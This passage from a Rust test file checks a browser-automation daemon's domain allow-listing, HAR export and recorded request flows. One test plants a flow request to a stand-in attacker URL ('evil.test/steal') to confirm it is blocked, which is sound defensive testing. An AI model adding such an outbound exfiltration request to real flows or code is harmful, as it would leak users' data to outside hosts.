    ];

    assert_eq!(
        network_control_session_ids_from_pages(&pages, None).unwrap(),
        vec!["session-1".to_string(), "session-2".to_string()]
    );
}

#[test]
fn test_network_control_session_ids_preserve_direct_page_session() {
    let pages = vec![super::super::browser::PageInfo {
        tab_id: 1,
        label: None,
        target_id: "provider-page".to_string(),
        session_id: String::new(),
        url: String::new(),
        title: String::new(),
        target_type: "page".to_string(),
    }];

    assert_eq!(
        network_control_session_ids_from_pages(&pages, None).unwrap(),
        vec![String::new()]
    );
}

#[tokio::test]
async fn test_allowed_domains_reject_providers_without_webrtc_containment() {
    let guard = EnvGuard::new(&["FROB_ALLOWED_DOMAINS"]);
    guard.remove("FROB_ALLOWED_DOMAINS");

    for provider in ["ios", "safari"] {
        let mut state = DaemonState::new();
        let error = handle_launch(
            &json!({
                "action": "launch",
                "provider": provider,
                "allowedDomains": ["example.com"]
            }),
            &mut state,
        )
        .await
        .unwrap_err();
        assert!(error.contains("WebRTC containment"), "got: {}", error);
        assert!(error.to_lowercase().contains(provider), "got: {}", error);
        assert!(
            state.domain_filter.read().await.is_none(),
            "rejected provider launch should not commit allowedDomains"
        );
    }
}

#[tokio::test]
async fn test_allowed_domains_reject_preexisting_external_cdp_sessions() {
    let guard = EnvGuard::new(&["FROB_ALLOWED_DOMAINS"]);
    guard.remove("FROB_ALLOWED_DOMAINS");

    let cases = [
        json!({
            "action": "launch",
            "cdpUrl": "ws://127.0.0.1:9222/devtools/browser/test",
            "allowedDomains": ["example.com"]
        }),
        json!({
            "action": "launch",
            "cdpPort": 9222,
            "allowedDomains": ["example.com"]
        }),
        json!({
            "action": "launch",
            "autoConnect": true,
            "allowedDomains": ["example.com"]
        }),
    ];

    for cmd in cases {
        let mut state = DaemonState::new();
        let error = handle_launch(&cmd, &mut state).await.unwrap_err();
        assert!(
            error.contains("existing page scripts"),
            "unexpected error: {}",
            error
        );
        assert!(
            state.domain_filter.read().await.is_none(),
            "rejected external launch should not commit allowedDomains"
        );
    }
}

#[test]
fn test_resolve_launch_target_inherits_attach_and_strips_local_fields() {
    let attached = AttachedTarget::CdpPort(9222);
    let own_target = json!({ "action": "launch", "cdpPort": 9333 });
    assert_eq!(resolve_launch_target(&own_target, Some(&attached)), None);

    let cmd = json!({
        "action": "launch",
        "executablePath": "/usr/bin/chromium",
        "args": ["--no-sandbox"],
        "headless": false,
        "allowedDomains": ["example.com"]
    });
    assert_eq!(resolve_launch_target(&cmd, None), None);
    assert_eq!(
        resolve_launch_target(&cmd, Some(&attached)),
        Some(json!({ "action": "launch", "cdpPort": 9222, "allowedDomains": ["example.com"] }))
    );
}

#[tokio::test]
async fn test_inherited_cdp_attach_refuses_allowed_domains() {
    let guard = EnvGuard::new(&["FROB_ALLOWED_DOMAINS"]);
    guard.remove("FROB_ALLOWED_DOMAINS");
    let mut state = DaemonState::new();
    state.attached_target = Some(AttachedTarget::CdpPort(9222));

    let error = handle_launch(
        &json!({ "action": "launch", "allowedDomains": ["example.com"] }),
        &mut state,
    )
    .await
    .unwrap_err();

    assert!(error.contains("not supported with --cdp"), "got: {}", error);
    assert!(state.domain_filter.read().await.is_none());
    assert_eq!(state.attached_target, Some(AttachedTarget::CdpPort(9222)));
}

#[tokio::test]
async fn test_close_clears_attached_target() {
    let mut state = DaemonState::new();
    state.attached_target = Some(AttachedTarget::CdpPort(9222));
    handle_close(&mut state).await.unwrap();
    assert_eq!(state.attached_target, None);
}

#[tokio::test]
async fn test_allowed_domains_reject_chrome_profiles() {
    let guard = EnvGuard::new(&["FROB_ALLOWED_DOMAINS"]);
    guard.remove("FROB_ALLOWED_DOMAINS");

    let mut state = DaemonState::new();
    let error = handle_launch(
        &json!({
            "action": "launch",
            "profile": "/tmp/frob-profile",
            "allowedDomains": ["example.com"]
        }),
        &mut state,
    )
    .await
    .unwrap_err();

    assert!(error.contains("--profile"), "got: {}", error);
    assert!(
        error.contains("restore existing pages"),
        "unexpected error: {}",
        error
    );
    assert!(
        state.domain_filter.read().await.is_none(),
        "rejected profile launch should not commit allowedDomains"
    );
}

#[tokio::test]
async fn test_allowed_domains_reject_restore_state_replay() {
    let guard = EnvGuard::new(&["FROB_ALLOWED_DOMAINS"]);
    guard.remove("FROB_ALLOWED_DOMAINS");

    let mut state = DaemonState::new();
    // `execute_command` applies the restore config before the launch handler.
    state.session_name = Some("saved-session".to_string());
    let error = handle_launch(
        &json!({
            "action": "launch",
            "restoreKey": "saved-session",
            "allowedDomains": ["example.com"]
        }),
        &mut state,
    )
    .await
    .unwrap_err();

    assert!(error.contains("--restore"), "got: {}", error);
    assert!(error.contains("replay origins"), "got: {}", error);
    assert!(
        state.domain_filter.read().await.is_none(),
        "rejected restore replay should not commit allowedDomains"
    );
    assert!(
        state.browser.is_none(),
        "restore replay should be rejected before launching Chrome"
    );
}

#[tokio::test]
async fn test_allowed_domains_reject_storage_state_replay() {
    let guard = EnvGuard::new(&["FROB_ALLOWED_DOMAINS"]);
    guard.remove("FROB_ALLOWED_DOMAINS");

    let mut state = DaemonState::new();
    let error = handle_launch(
        &json!({
            "action": "launch",
            "storageState": "/tmp/frob-state.json",
            "allowedDomains": ["example.com"]
        }),
        &mut state,
    )
    .await
    .unwrap_err();

    assert!(error.contains("--state/storageState"), "got: {}", error);
    assert!(error.contains("replays saved origins"), "got: {}", error);
    assert!(
        state.domain_filter.read().await.is_none(),
        "rejected storageState replay should not commit allowedDomains"
    );
    assert!(
        state.browser.is_none(),
        "storageState replay should be rejected before launching Chrome"
    );
}

#[tokio::test]
async fn test_state_replay_rejects_active_domain_filter() {
    let guard = EnvGuard::new(&["FROB_ALLOWED_DOMAINS"]);
    guard.remove("FROB_ALLOWED_DOMAINS");

    let state = DaemonState::new();
    {
        let mut df = state.domain_filter.write().await;
        *df = Some(DomainFilter::new("example.com"));
    }

    let error = ensure_state_replay_supported_by_active_domain_filter(&state, "state load")
        .await
        .unwrap_err();

    assert!(error.contains("state load"), "got: {}", error);
    assert!(error.contains("replays saved origins"), "got: {}", error);
}

#[test]
fn test_allowed_domains_disallowed_chrome_arg_detects_startup_args() {
    let cases = [
        (
            vec!["--user-data-dir=/tmp/profile".to_string()],
            "--user-data-dir",
        ),
        (
            vec!["/profile-directory=Default".to_string()],
            "--profile-directory",
        ),
        (
            vec!["-restore-last-session".to_string()],
            "--restore-last-session",
        ),
        (vec!["--app=https://example.com".to_string()], "--app"),
        (vec!["https://example.com".to_string()], "a startup URL"),
        (vec!["HTTPS://example.com".to_string()], "a startup URL"),
        (vec!["FILE:///tmp/page.html".to_string()], "a startup URL"),
        (vec!["example.com".to_string()], "a startup URL or path"),
        (vec!["/tmp/page.html".to_string()], "a startup URL or path"),
        (
            vec!["C:\\tmp\\page.html".to_string()],
            "a startup URL or path",
        ),
    ];

    for (args, expected) in cases {
        assert_eq!(allowed_domains_disallowed_chrome_arg(&args), Some(expected));
    }

    assert_eq!(
        allowed_domains_disallowed_chrome_arg(&["--window-size=1280,720".to_string()]),
        None
    );
}

#[tokio::test]
async fn test_allowed_domains_reject_profile_chrome_args() {
    let guard = EnvGuard::new(&["FROB_ALLOWED_DOMAINS"]);
    guard.remove("FROB_ALLOWED_DOMAINS");

    let mut state = DaemonState::new();
    let error = handle_launch(
        &json!({
            "action": "launch",
            "args": ["--user-data-dir=/tmp/frob-profile"],
            "allowedDomains": ["example.com"]
        }),
        &mut state,
    )
    .await
    .unwrap_err();

    assert!(error.contains("--args"), "got: {}", error);
    assert!(error.contains("--user-data-dir"), "got: {}", error);
    assert!(
        error.contains("restore or open pages"),
        "unexpected error: {}",
        error
    );
    assert!(
        state.domain_filter.read().await.is_none(),
        "rejected raw profile args should not commit allowedDomains"
    );
}

#[tokio::test]
async fn test_allowed_domains_reject_env_profile_during_auto_launch() {
    let guard = EnvGuard::new(&[
        "FROB_ALLOWED_DOMAINS",
        "FROB_PROFILE",
        "FROB_ARGS",
        "FROB_CDP",
        "FROB_AUTO_CONNECT",
        "FROB_PROVIDER",
    ]);
    guard.set("FROB_ALLOWED_DOMAINS", "example.com");
    guard.set("FROB_PROFILE", "/tmp/frob-profile");
    guard.remove("FROB_ARGS");
    guard.remove("FROB_CDP");
    guard.remove("FROB_AUTO_CONNECT");
    guard.remove("FROB_PROVIDER");

    let mut state = DaemonState::new();
    let error = auto_launch(&mut state, Vec::new()).await.unwrap_err();

    assert!(error.contains("--profile"), "got: {}", error);
    assert!(
        error.contains("restore existing pages"),
        "unexpected error: {}",
        error
    );
    assert!(
        state.browser.is_none(),
        "auto_launch should reject before launching Chrome"
    );
}

#[tokio::test]
async fn test_allowed_domains_reject_env_profile_args_during_auto_launch() {
    let guard = EnvGuard::new(&[
        "FROB_ALLOWED_DOMAINS",
        "FROB_PROFILE",
        "FROB_ARGS",
        "FROB_STATE",
        "FROB_SESSION_NAME",
        "FROB_CDP",
        "FROB_AUTO_CONNECT",
        "FROB_PROVIDER",
    ]);
    guard.set("FROB_ALLOWED_DOMAINS", "example.com");
    guard.remove("FROB_PROFILE");
    guard.set("FROB_ARGS", "--user-data-dir=/tmp/frob-profile");
    guard.remove("FROB_STATE");
    guard.remove("FROB_SESSION_NAME");
    guard.remove("FROB_CDP");
    guard.remove("FROB_AUTO_CONNECT");
    guard.remove("FROB_PROVIDER");

    let mut state = DaemonState::new();
    let error = auto_launch(&mut state, Vec::new()).await.unwrap_err();

    assert!(error.contains("--args"), "got: {}", error);
    assert!(error.contains("--user-data-dir"), "got: {}", error);
    assert!(
        state.browser.is_none(),
        "auto_launch should reject raw profile args before launching Chrome"
    );
}

#[tokio::test]
async fn test_allowed_domains_reject_env_restore_during_auto_launch() {
    let guard = EnvGuard::new(&[
        "FROB_ALLOWED_DOMAINS",
        "FROB_PROFILE",
        "FROB_ARGS",
        "FROB_STATE",
        "FROB_SESSION_NAME",
        "FROB_CDP",
        "FROB_AUTO_CONNECT",
        "FROB_PROVIDER",
    ]);
    guard.set("FROB_ALLOWED_DOMAINS", "example.com");
    guard.set("FROB_SESSION_NAME", "saved-session");
    guard.remove("FROB_PROFILE");
    guard.remove("FROB_ARGS");
    guard.remove("FROB_STATE");
    guard.remove("FROB_CDP");
    guard.remove("FROB_AUTO_CONNECT");
    guard.remove("FROB_PROVIDER");

    let mut state = DaemonState::new();
    let error = auto_launch(&mut state, Vec::new()).await.unwrap_err();

    assert!(error.contains("--restore"), "got: {}", error);
    assert!(
        state.browser.is_none(),
        "auto_launch should reject restore replay before launching Chrome"
    );
}

#[tokio::test]
async fn test_allowed_domains_reject_env_storage_state_during_auto_launch() {
    let guard = EnvGuard::new(&[
        "FROB_ALLOWED_DOMAINS",
        "FROB_PROFILE",
        "FROB_ARGS",
        "FROB_STATE",
        "FROB_SESSION_NAME",
        "FROB_CDP",
        "FROB_AUTO_CONNECT",
        "FROB_PROVIDER",
    ]);
    guard.set("FROB_ALLOWED_DOMAINS", "example.com");
    guard.set("FROB_STATE", "/tmp/frob-state.json");
    guard.remove("FROB_PROFILE");
    guard.remove("FROB_ARGS");
    guard.remove("FROB_SESSION_NAME");
    guard.remove("FROB_CDP");
    guard.remove("FROB_AUTO_CONNECT");
    guard.remove("FROB_PROVIDER");

    let mut state = DaemonState::new();
    let error = auto_launch(&mut state, Vec::new()).await.unwrap_err();

    assert!(error.contains("--state/storageState"), "got: {}", error);
    assert!(
        state.browser.is_none(),
        "auto_launch should reject storage state replay before launching Chrome"
    );
}

#[cfg(unix)]
#[tokio::test]
async fn test_allowed_domains_reject_plugin_profile_args() {
    use std::os::unix::fs::PermissionsExt;

    let guard = EnvGuard::new(&["FROB_ALLOWED_DOMAINS"]);
    guard.remove("FROB_ALLOWED_DOMAINS");
    let dir = tempfile::tempdir().unwrap();
    let plugin_path = dir.path().join("mock-launch-mutator");
    fs::write(
            &plugin_path,
            r#"#!/bin/sh
cat >/dev/null
printf '%s' '{"protocol":"frob.plugin.v1","success":true,"launch":{"args":["--user-data-dir=/tmp/plugin-profile"]}}'
"#,
        )
        .unwrap();
    let mut perms = fs::metadata(&plugin_path).unwrap().permissions();
    perms.set_mode(0o755);
    fs::set_permissions(&plugin_path, perms).unwrap();

    let mut state = DaemonState::new();
    let error = handle_launch(
        &json!({
            "action": "launch",
            "allowedDomains": ["example.com"],
            "plugins": [
                {
                    "name": "profile-mutator",
                    "command": plugin_path.to_string_lossy(),
                    "capabilities": ["launch.mutate"]
                }
            ]
        }),
        &mut state,
    )
    .await
    .unwrap_err();

    assert!(error.contains("--args"), "got: {}", error);
    assert!(error.contains("--user-data-dir"), "got: {}", error);
    assert!(
        state.domain_filter.read().await.is_none(),
        "rejected plugin args should not commit allowedDomains"
    );
    assert!(
        state.browser.is_none(),
        "plugin args should be rejected before launching Chrome"
    );
}

#[cfg(unix)]
#[tokio::test]
async fn test_allowed_domains_reject_direct_page_provider_plugins() {
    use std::os::unix::fs::PermissionsExt;

    let guard = EnvGuard::new(&["FROB_ALLOWED_DOMAINS"]);
    guard.remove("FROB_ALLOWED_DOMAINS");
    let dir = tempfile::tempdir().unwrap();
    let plugin_path = dir.path().join("mock-direct-page-provider");
    fs::write(
            &plugin_path,
            r#"#!/bin/sh
cat >/dev/null
printf '%s' '{"protocol":"frob.plugin.v1","success":true,"browser":{"cdpUrl":"ws://127.0.0.1:9222/devtools/page/test","directPage":true}}'
"#,
        )
        .unwrap();
    let mut perms = fs::metadata(&plugin_path).unwrap().permissions();
    perms.set_mode(0o755);
    fs::set_permissions(&plugin_path, perms).unwrap();

    let mut state = DaemonState::new();
    let error = handle_launch(
        &json!({
            "action": "launch",
            "provider": "direct-page",
            "allowedDomains": ["example.com"],
            "plugins": [
                {
                    "name": "direct-page",
                    "command": plugin_path.to_string_lossy(),
                    "capabilities": ["browser.provider"]
                }
            ]
        }),
        &mut state,
    )
    .await
    .unwrap_err();

    assert!(
        error.contains("direct-page browser providers"),
        "got: {}",
        error
    );
    assert!(
        state.domain_filter.read().await.is_none(),
        "rejected direct-page provider should not commit allowedDomains"
    );
    assert!(
        state.browser.is_none(),
        "direct-page provider should be rejected before CDP connect"
    );
}

#[test]
fn test_write_extensions_file_from_paths_uses_final_extensions() {
    let guard = EnvGuard::new(&["FROB_SOCKET_DIR", "FROB_EXTENSIONS"]);
    let dir = tempfile::tempdir().unwrap();
    guard.set("FROB_SOCKET_DIR", dir.path().to_str().unwrap());
    guard.set("FROB_EXTENSIONS", "/env/ext");
    let extensions = vec![
        " /plugin/ext ".to_string(),
        "".to_string(),
        "/plugin/other".to_string(),
    ];

    write_extensions_file_from_paths("metadata-test", &Running::from_env(), Some(&extensions));

    let content = fs::read_to_string(extensions_file_path("metadata-test")).unwrap();
    assert_eq!(content, "/plugin/ext,/plugin/other");
}

#[test]
fn test_write_extensions_file_from_paths_falls_back_to_env() {
    let guard = EnvGuard::new(&["FROB_SOCKET_DIR", "FROB_EXTENSIONS"]);
    let dir = tempfile::tempdir().unwrap();
    guard.set("FROB_SOCKET_DIR", dir.path().to_str().unwrap());
    guard.set("FROB_EXTENSIONS", "/env/ext");

    write_extensions_file_from_paths("metadata-env-test", &Running::from_env(), None);

    let content = fs::read_to_string(extensions_file_path("metadata-env-test")).unwrap();
    assert_eq!(content, "/env/ext");
}

#[test]
fn test_har_entry_to_json_enriches_request_and_response() {
    // wall_time: 2026-03-15T12:00:00Z = 1_773_576_000
    let entry = HarEntry {
        request_id: "req-1".to_string(),
        wall_time: 1773576000.0,
        method: "POST".to_string(),
        url: "https://example.com/api?foo=bar&baz=qux".to_string(),
        request_headers: vec![
            ("Accept".to_string(), "application/json".to_string()),
            ("Content-Type".to_string(), "application/json".to_string()),
            ("Cookie".to_string(), "session=abc; theme=dark".to_string()),
        ],
        post_data: Some(r#"{"x":1}"#.to_string()),
        request_body_size: 7,
        resource_type: "XHR".to_string(),
        status: Some(201),
        status_text: "Created".to_string(),
        http_version: "HTTP/2.0".to_string(),
        response_headers: vec![
            ("content-type".to_string(), "application/json".to_string()),
            (
                "location".to_string(),
                "https://example.com/api/1".to_string(),
            ),
            (
                "set-cookie".to_string(),
                "token=xyz; Path=/; HttpOnly".to_string(),
            ),
        ],
        mime_type: "application/json".to_string(),
        redirect_url: "https://example.com/api/1".to_string(),
        response_body_size: 42,
        cdp_timing: None,
        loading_finished_timestamp: None,
        response_body: None,
        response_body_base64: false,
        remote_addr: None,
    };

    let har = har_entry_to_json(&entry);
    assert_eq!(har["startedDateTime"], "2026-03-15T12:00:00Z");
    assert_eq!(har["request"]["method"], "POST");
    assert_eq!(har["request"]["httpVersion"], "HTTP/2.0");
    assert_eq!(har["request"]["queryString"][0]["name"], "foo");
    assert_eq!(har["request"]["queryString"][0]["value"], "bar");
    assert_eq!(har["request"]["bodySize"], 7);
    assert_eq!(har["request"]["postData"]["mimeType"], "application/json");
    assert_eq!(har["request"]["postData"]["text"], r#"{"x":1}"#);
    assert_eq!(har["request"]["cookies"][0]["name"], "session");
    assert_eq!(har["request"]["cookies"][0]["value"], "abc");
    assert_eq!(har["request"]["cookies"][1]["name"], "theme");
    assert_eq!(har["request"]["cookies"][1]["value"], "dark");
    assert_eq!(har["response"]["status"], 201);
    assert_eq!(har["response"]["statusText"], "Created");
    assert_eq!(har["response"]["content"]["mimeType"], "application/json");
    assert_eq!(har["response"]["content"]["size"], 42);
    assert_eq!(har["response"]["redirectURL"], "https://example.com/api/1");
    assert_eq!(har["response"]["cookies"][0]["name"], "token");
    assert_eq!(har["response"]["cookies"][0]["value"], "xyz");
    assert_eq!(har["_resourceType"], "XHR");
    // No body captured: content carries size/MIME only.
    assert!(har["response"]["content"].get("text").is_none());
    assert!(har["response"]["content"].get("encoding").is_none());
}

#[test]
fn test_har_entry_to_json_embeds_response_body() {
    let mut entry = HarEntry {
        request_id: "req-2".to_string(),
        wall_time: 1773576000.0,
        method: "GET".to_string(),
        url: "https://example.com/api/items".to_string(),
        request_headers: vec![],
        post_data: None,
        request_body_size: 0,
        resource_type: "XHR".to_string(),
        status: Some(200),
        status_text: "OK".to_string(),
        http_version: "HTTP/2.0".to_string(),
        response_headers: vec![],
        mime_type: "application/json".to_string(),
        redirect_url: String::new(),
        response_body_size: 13,
        cdp_timing: None,
        loading_finished_timestamp: None,
        response_body: Some(r#"{"items":[1]}"#.to_string()),
        response_body_base64: false,
        remote_addr: None,
    };

    let har = har_entry_to_json(&entry);
    assert_eq!(har["response"]["content"]["text"], r#"{"items":[1]}"#);
    assert!(har["response"]["content"].get("encoding").is_none());

    entry.response_body = Some("aGVsbG8=".to_string());
    entry.response_body_base64 = true;
    let har = har_entry_to_json(&entry);
    assert_eq!(har["response"]["content"]["text"], "aGVsbG8=");
    assert_eq!(har["response"]["content"]["encoding"], "base64");
}

#[test]
fn test_har_mime_is_text() {
    assert!(har_mime_is_text("application/json"));
    assert!(har_mime_is_text("application/json; charset=utf-8"));
    assert!(har_mime_is_text("application/vnd.api+json"));
    assert!(har_mime_is_text("text/html"));
    assert!(har_mime_is_text("text/plain"));
    assert!(har_mime_is_text("image/svg+xml"));
    assert!(har_mime_is_text("application/x-www-form-urlencoded"));
    assert!(!har_mime_is_text("image/png"));
    assert!(!har_mime_is_text("application/octet-stream"));
    assert!(!har_mime_is_text("video/mp4"));
    assert!(!har_mime_is_text(""));
}

#[test]
fn test_har_content_mode_parse() {
    assert_eq!(HarContentMode::parse("text"), Ok(HarContentMode::Text));
    assert_eq!(HarContentMode::parse("all"), Ok(HarContentMode::All));
    assert_eq!(HarContentMode::parse("none"), Ok(HarContentMode::None));
    assert!(HarContentMode::parse("everything").is_err());
    assert_eq!(HarContentMode::default(), HarContentMode::Text);
}

#[test]
fn test_har_wall_time_to_rfc3339_epoch() {
    // Known timestamp: 2026-03-15T12:00:00Z = 1_773_576_000
    let result = har_wall_time_to_rfc3339(1773576000.0);
    assert!(result.starts_with("2026-03-15T12:00:00"));
}

#[test]
fn test_har_wall_time_to_rfc3339_fractional_seconds() {
    let result = har_wall_time_to_rfc3339(1773576000.456);
    assert!(result.contains(".456") || result.contains("456"));
}

#[test]
fn test_har_cdp_protocol_to_http_version() {
    assert_eq!(har_cdp_protocol_to_http_version("h2"), "HTTP/2.0");
    assert_eq!(har_cdp_protocol_to_http_version("h3"), "HTTP/3.0");
    assert_eq!(har_cdp_protocol_to_http_version("http/1.0"), "HTTP/1.0");
    assert_eq!(har_cdp_protocol_to_http_version("http/1.1"), "HTTP/1.1");
    assert_eq!(har_cdp_protocol_to_http_version("unknown"), "HTTP/1.1");
}

#[test]
fn test_har_parse_request_cookies() {
    let cookies = har_parse_request_cookies("session=abc; theme=dark; empty=");
    assert_eq!(cookies.len(), 3);
    assert_eq!(cookies[0]["name"], "session");
    assert_eq!(cookies[0]["value"], "abc");
    assert_eq!(cookies[1]["name"], "theme");
    assert_eq!(cookies[1]["value"], "dark");
    assert_eq!(cookies[2]["name"], "empty");
    assert_eq!(cookies[2]["value"], "");
}

#[test]
fn test_har_set_cookie_strips_attributes_before_equal_split() {
    let entry = HarEntry {
        request_id: "r".to_string(),
        wall_time: 1773576000.0,
        method: "GET".to_string(),
        url: "https://example.com/".to_string(),
        request_headers: vec![],
        post_data: None,
        request_body_size: 0,
        resource_type: "Document".to_string(),
        status: Some(200),
        status_text: "OK".to_string(),
        http_version: "HTTP/1.1".to_string(),
        response_headers: vec![(
            "set-cookie".to_string(),
            "token=abc; Path=/; HttpOnly".to_string(),
        )],
        mime_type: "text/html".to_string(),
        redirect_url: String::new(),
        response_body_size: 0,
        cdp_timing: None,
        loading_finished_timestamp: None,
        response_body: None,
        response_body_base64: false,
        remote_addr: None,
    };
    let har = har_entry_to_json(&entry);
    assert_eq!(har["response"]["cookies"][0]["name"], "token");
    assert_eq!(har["response"]["cookies"][0]["value"], "abc");
}

#[test]
fn test_har_compute_timings_no_cdp_timing() {
    let (timings, total) = har_compute_timings(None, None);
    assert_eq!(timings["send"], 0);
    assert_eq!(timings["wait"], 0);
    assert_eq!(timings["receive"], 0);
    assert_eq!(total, 0.0);
}

#[test]
fn test_har_compute_timings_with_cdp_timing() {
    let cdp = json!({
        "requestTime": 1000.0,
        "dnsStart": 0.0, "dnsEnd": 5.0,
        "connectStart": 5.0, "connectEnd": 15.0,
        "sslStart": 8.0, "sslEnd": 15.0,
        "sendStart": 15.0, "sendEnd": 16.0,
        "receiveHeadersStart": 16.0, "receiveHeadersEnd": 50.0,
    });
    let (timings, total) = har_compute_timings(Some(&cdp), Some(1000.1));
    assert_eq!(timings["dns"], 5.0);
    assert_eq!(timings["connect"], 10.0);
    assert_eq!(timings["ssl"], 7.0);
    assert_eq!(timings["send"], 1.0);
    assert!(total > 0.0);
}

#[tokio::test]
async fn test_handle_har_stop_without_path_uses_default_location() {
    let mut state = DaemonState::new();
    state.har_recording = true;
    state.har_entries.push(HarEntry {
        request_id: "req-2".to_string(),
        wall_time: 1773576000.0,
        method: "GET".to_string(),
        url: "https://example.com/".to_string(),
        request_headers: vec![("Accept".to_string(), "text/html".to_string())],
        post_data: None,
        request_body_size: 0,
        resource_type: "Document".to_string(),
        status: Some(200),
        status_text: "OK".to_string(),
        http_version: "HTTP/2.0".to_string(),
        response_headers: vec![("content-type".to_string(), "text/html".to_string())],
        mime_type: "text/html".to_string(),
        redirect_url: String::new(),
        response_body_size: 128,
        cdp_timing: None,
        loading_finished_timestamp: None,
        response_body: None,
        response_body_base64: false,
        remote_addr: None,
    });

    let result = handle_har_stop(&json!({ "action": "har_stop" }), &mut state)
        .await
        .unwrap();

    let path = result["path"].as_str().unwrap();
    assert!(path.ends_with(".har"));
    assert!(std::path::Path::new(path).starts_with(get_har_dir()));
    assert_eq!(result["requestCount"], 1);
    assert!(!state.har_recording);
    assert!(state.har_entries.is_empty());

    let har: Value = serde_json::from_str(&fs::read_to_string(path).unwrap()).unwrap();
    assert_eq!(har["log"]["version"], "1.2");
    assert_eq!(har["log"]["creator"]["name"], "frob");
    assert!(har["log"].get("browser").is_none());
    assert_eq!(har["log"]["entries"][0]["response"]["content"]["size"], 128);

    let _ = fs::remove_file(path);
}

#[tokio::test]
async fn har_commands_are_refused_while_capture_owns_the_recorder() {
    let mut state = DaemonState::new();
    state.har_recording = true;
    state.flow.begin_capture(None);
    let stop = handle_har_stop(&json!({}), &mut state).await.unwrap_err();
    assert_eq!(stop, "capture is owned by --capture flow; use flow save");
    assert!(state.har_recording);
    let start = handle_har_start(&json!({}), &mut state).await.unwrap_err();
    assert!(start.contains("--capture flow"), "{start}");
}

#[tokio::test]
async fn a_flow_edited_to_reach_another_host_is_rejected_before_any_request() {
    let dir = tempfile::tempdir().unwrap();
    let guard = crate::test_utils::EnvGuard::new(&["FROB_FLOWS_DIR"]);
    guard.set("FROB_FLOWS_DIR", dir.path().to_str().unwrap());
    let flow = json!({
        "version": 1, "name": "edited", "origin": "example.com",
        "startUrl": "https://example.com/", "allowedHosts": ["example.com"],
        "params": [], "output": "s1r1", "itemFields": [], "verifiedAt": null,
        "steps": [{ "seq": 1, "ok": true, "command": { "action": "navigate" }, "requests": [{
            "id": "s1r1", "method": "GET", "url": "https://evil.test/steal",
            "headers": {}, "body": null,
            "expect": { "status": 200, "mime": "application/json", "signature": {}, "bytes": 2, "itemFields": [], "extract": null }
        }] }]
    });
    save_flow_json(flow);
    let mut state = DaemonState::new();
    let err = handle_flow_run(
        &json!({ "name": "edited", "params": {} }),
        &mut state,
        super::super::flow::load_flow("edited", None).unwrap(),
    )
    .await
    .unwrap_err();
    assert!(
        err.contains("evil.test") && err.contains("outside the hosts"),
        "{err}"
    );
}

/// A flow with one POST to a local server that answers `{"ok":true}`.
fn save_flow_json(flow: Value) {
    let flow = super::super::flow::flow_of(flow);
    super::super::flow::write_flow(&flow).unwrap();
}

fn write_flow_fixture(dir: &std::path::Path, port: u16) {
    let url = format!("http://127.0.0.1:{}/api/cart", port);
    let flow = json!({
        "version": 1, "name": "cart", "origin": "127.0.0.1",
        "startUrl": format!("http://127.0.0.1:{}/", port), "allowedHosts": ["127.0.0.1"],
        "params": [], "output": "s1r1", "itemFields": [], "verifiedAt": null,
        "writes": [{ "id": "s1r1", "method": "POST", "url": url, "kind": "explicit", "step": 1 }],
        "steps": [{ "seq": 1, "ok": true, "command": { "action": "click" }, "requests": [{
            "id": "s1r1", "method": "POST", "url": url, "headers": {}, "body": "{}",
            "expect": { "status": 200, "mime": "application/json",
                "signature": super::super::flow::signature(&json!({ "ok": true })),
                "bytes": 11, "itemFields": [], "extract": null }
        }] }]
    });
    let _ = dir;
    save_flow_json(flow);
}

fn serve_json_once() -> u16 {
    let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
    let port = listener.local_addr().unwrap().port();
    std::thread::spawn(move || {
        use std::io::{Read, Write};
        while let Ok((mut stream, _)) = listener.accept() {
            let mut buf = [0u8; 4096];
            let _ = stream.read(&mut buf);
            let body = r#"{"ok":true}"#;
            let _ = write!(
                    stream,
                    "HTTP/1.1 200 OK\r\ncontent-type: application/json\r\ncontent-length: {}\r\nconnection: close\r\n\r\n{}",
                    body.len(),
                    body
                );
        }
    });
    port
}

#[tokio::test]
async fn flow_writes_go_through_confirmation_as_policy_actions() {
    let dir = tempfile::tempdir().unwrap();
    let guard = crate::test_utils::EnvGuard::new(&["FROB_FLOWS_DIR"]);
    guard.set("FROB_FLOWS_DIR", dir.path().to_str().unwrap());
    write_flow_fixture(dir.path(), serve_json_once());
    let run = json!({ "id": "r1", "action": "flow_run", "name": "cart", "params": {} });
    assert_eq!(
        policy_actions_for_command(
            &run,
            "flow_run",
            false,
            None,
            super::super::flow::load_flow("cart", None).ok().as_ref(),
            &Running::from_env(),
        ),
        vec!["flow_run".to_string(), "flow_write:s1r1".to_string()]
    );

    // Not allowed: the run asks, and a confirmation lets it through once.
    let mut state = DaemonState::new();
    state.policy = None;
    state.confirm_actions = None;
    let resp = execute_command(&run, &mut state).await;
    assert_eq!(resp["data"]["confirmation_required"], true, "{resp}");
    assert_eq!(resp["data"]["action"], "flow_write:s1r1");
    let confirmed = execute_command(&json!({ "id": "c1", "action": "confirm" }), &mut state).await;
    assert_eq!(
        confirmed["data"]["result"]["data"]["ok"], true,
        "{confirmed}"
    );

    // Allowed by id or by all: no confirmation.
    for allow in ["s1r1", "all"] {
        let mut cmd = run.clone();
        cmd["allowWrite"] = json!(allow);
        let resp = execute_command(&cmd, &mut state).await;
        assert_eq!(resp["data"]["ok"], true, "{allow}: {resp}");
    }

    // An id that is not a write of the flow is an error, not a pass.
    let mut cmd = run.clone();
    cmd["allowWrite"] = json!("nope");
    let resp = execute_command(&cmd, &mut state).await;
    assert!(
        resp["error"]
            .as_str()
            .unwrap()
            .contains("not a write of this flow"),
        "{resp}"
    );
}

fn serve_fixed(response: &'static str) -> u16 {
    let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
    let port = listener.local_addr().unwrap().port();
    std::thread::spawn(move || {
        use std::io::{Read, Write};
        while let Ok((mut stream, _)) = listener.accept() {
            let mut buf = [0u8; 4096];
            let _ = stream.read(&mut buf);
            let _ = stream.write_all(response.as_bytes());
        }
    });
    port
}

/// A server that counts the requests it reads and answers with `response`,
/// or closes the connection when it is empty.
fn serve_counting(response: &'static str) -> (u16, std::sync::Arc<std::sync::atomic::AtomicUsize>) {
    let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
    let port = listener.local_addr().unwrap().port();
    let hits = std::sync::Arc::new(std::sync::atomic::AtomicUsize::new(0));
    let counter = hits.clone();
    std::thread::spawn(move || {
        use std::io::{Read, Write};
        while let Ok((mut stream, _)) = listener.accept() {
            let mut buf = [0u8; 4096];
            let _ = stream.read(&mut buf);
            counter.fetch_add(1, std::sync::atomic::Ordering::SeqCst);
            if !response.is_empty() {
                let _ = stream.write_all(response.as_bytes());
            }
        }
    });
